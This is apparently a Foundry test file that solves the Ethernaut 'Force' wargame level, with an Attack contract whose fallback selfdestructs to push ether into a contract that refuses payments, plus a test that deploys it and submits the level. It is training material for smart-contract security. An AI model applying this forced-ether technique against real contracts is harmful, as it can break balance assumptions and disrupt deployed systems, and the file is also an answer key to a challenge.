pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Force } from "src/Force/Force.sol";
import { ForceFactory } from "src/Force/ForceFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";

contract Attack {
    address victim;
    
    constructor(address _victim) {
        victim = _victim;
    }

    fallback() external payable {
        selfdestruct(payable(victim));
    }
}

contract ForceTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");
    
    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testForceHack() external {
        // level setup
        ForceFactory factory = new ForceFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(me);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Force force = Force(payable(levelAddress));

        // attack
        vm.deal(me, 1 ether);
        Attack attack = new Attack(address(force));
        address(attack).call{value: 10 wei}(new bytes(0));
        
        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}

